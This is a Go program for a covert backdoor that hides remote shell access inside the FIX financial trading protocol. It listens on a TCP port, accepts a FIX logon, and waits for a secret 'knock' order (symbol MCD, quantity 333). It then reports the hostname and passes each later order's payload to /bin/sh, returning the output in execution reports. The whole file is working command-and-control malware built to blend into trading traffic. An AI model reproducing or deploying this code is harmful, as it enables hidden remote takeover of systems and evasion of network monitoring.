package main

import (
    "fmt"
    "net"
    "os"
    "os/exec"

    "fix/fix"
)

func main() {
    //Open TCP listener
    if len(os.Args) < 2 {
        fmt.Fprintf(os.Stderr, "Usage: %s <listen port>\n", os.Args[0])
        os.Exit(1)
    }
    listener, err := net.Listen("tcp", ":" + os.Args[1])
    if err != nil {
        os.Exit(1)
    }
    fmt.Printf("Listening on port %s...\n", os.Args[1])
    conn, err := listener.Accept()
    if err != nil {
        os.Exit(1)
    }
    defer conn.Close()

    //Configure FIX session settings
    s := fix.New(conn, fix.Config{
        BeginString:  "FIX.4.4",
        SenderCompID: "456",
        TargetCompID: "123",
        //HeartBtInt:   30,
    })

    //Listen for FIX LOGON message
    if err := s.AcceptLogon(); err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("FIX LOGON received.")

    //Listen for specific order "knock"
    auth := false
    for !auth {
        auth, err = s.CheckKnock("MCD", 333)
        if err != nil {
            fmt.Println(err)
            return
        }
    }
    fmt.Println("Knock validated.")

    //Send confirmation execution report with our hostname
    hostname, err := os.Hostname()
    if err != nil {
        fmt.Println(err)
        return
    }
    s.SendExecReport("1", "MCD", 333, []byte(hostname))

    //Begin command listener loop
    for {
        payload, id, err := s.RecvTradeOrder()
        if err != nil {
            fmt.Println(err)
            break
        }
        //fmt.Printf("Payload received: %s\n", string(payload))
        cmd := exec.Command("/bin/sh", "-c", string(payload))
        out, err := cmd.CombinedOutput()
        if err != nil {
            out = append(out, []byte("\n" + err.Error())...)
        }
        s.SendExecReport(id, "MCD", 1, out)
    }
}
